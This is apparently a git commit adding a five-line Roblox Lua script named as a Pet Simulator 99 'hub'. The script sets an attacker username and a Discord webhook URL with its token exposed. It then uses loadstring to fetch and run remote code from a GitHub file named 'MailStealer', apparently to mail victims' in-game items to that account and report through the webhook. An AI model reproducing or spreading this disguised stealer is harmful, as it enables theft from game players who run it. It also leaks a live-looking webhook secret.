0d9250a6dd1a6b04732d53f832fd27eeeb5b0a49
Reparticle <luey08@icloud.com>
2024-12-27 18:30:01 -0600

    Add files via upload

---
+++ ps99mooshub.lua
@@ -0,0 +1,5 @@
+Username = "altdungeonfighter"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1322348305514238063/kzLAjcPgFmdygQesp7mfB29GwZBFB6gHvB1ynTrPlCFGit0Ha839-E8qB6UQUySqxq8Y" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()!
